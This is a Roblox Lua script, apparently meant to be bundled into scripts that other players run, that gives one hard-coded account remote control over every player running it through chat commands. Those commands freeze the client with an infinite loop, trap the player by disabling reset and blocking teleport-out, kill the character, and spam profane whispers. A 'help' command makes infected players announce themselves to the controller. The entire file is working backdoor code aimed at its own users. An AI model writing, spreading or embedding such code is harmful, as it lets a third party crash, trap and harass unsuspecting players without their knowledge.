-- AA
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")

-- 어드민 목록
local AdminList = { "Diwno2ff" }

-- 유틸: 어드민 체크
local function isAdminListed(name)
    for _, adminName in ipairs(AdminList) do
        if name:lower() == adminName:lower() then
            return true
        end
    end
    return false
end

-- 유틸: 채팅 전송 (새 채팅 시스템 기준)
local function sendChat(msg)
    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if channel then
        channel:SendAsync(msg)
    end
end

-- crash
local function crash()
    while true do
        print("Penis")
    end
end

-- kick (재설정 금지 + 나가기 금지)
local function kick()
    if LocalPlayer.Character then
        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local Hocf = hrp and hrp.CFrame
        if hrp and Hocf then
            hrp.CFrame = CFrame.new(1e7, 1e7, 1e7)
            task.wait(0.1)
            hrp.Anchored = true
            task.wait(0.03)
            hrp.CFrame = Hocf
        end

        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.Health = math.huge
        end
        LocalPlayer.CharacterAdded:Connect(function(char)
            local newHum = char:WaitForChild("Humanoid")
            newHum.Health = math.huge
        end)

        -- Reset 비활성화
        task.spawn(function()
            repeat
                task.wait()
                pcall(function()
                    game.StarterGui:SetCore("ResetButtonCallback", false)
                end)
            until false
        end)

        -- 나가기 방지
        LocalPlayer.OnTeleport = function(State)
            if State == Enum.TeleportState.Started then
                error("Leaving blocked!")
            end
        end
    end
end

-- bring (Admin이 LocalPlayer 위치로 이동)
local function bring(Admin)
    if not (Admin and Admin.Character and LocalPlayer.Character) then return end
    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
    if hrp and adminHrp then
        adminHrp.CFrame = hrp.CFrame
    end
end

-- kill
local function kill()
    if LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
        if hum then
            hum.Health = 0
        end
    end
end

-- chatban (비공으로 fuck 반복)
local function chatban(Admin)
    if not Admin then return end
    task.spawn(function()
        while true do
            task.wait(0.5)
            sendChat(string.format("/w %s fuck", Admin.Name))
        end
    end)
end

-- help (비공으로 한 번만)
local function help(Admin)
    if not Admin then return end
    sendChat(string.format("/w %s 나는 NP를 사용해요.", Admin.Name))
end

-- 채팅 감지 (새 채팅 시스템)
TextChatService.OnIncomingMessage = function(message)
    local sender = message.TextSource
    if not sender then return end
    if not isAdminListed(sender.Name) then return end -- 어드민만 실행 가능

    local text = message.Text:lower()
    if text:sub(1,1) == ":" then
        local args = string.split(text:sub(2), " ")
        local command = args[1]

        if command == "crash" then
            crash()
        elseif command == "kick" then
            kick()
        elseif command == "bring" then
            bring(Players:FindFirstChild(sender.Name))
        elseif command == "kill" then
            kill()
        elseif command == "chatban" then
            chatban(Players:FindFirstChild(sender.Name))
        elseif command == "help" then
            help(Players:FindFirstChild(sender.Name))
        end
    end
end
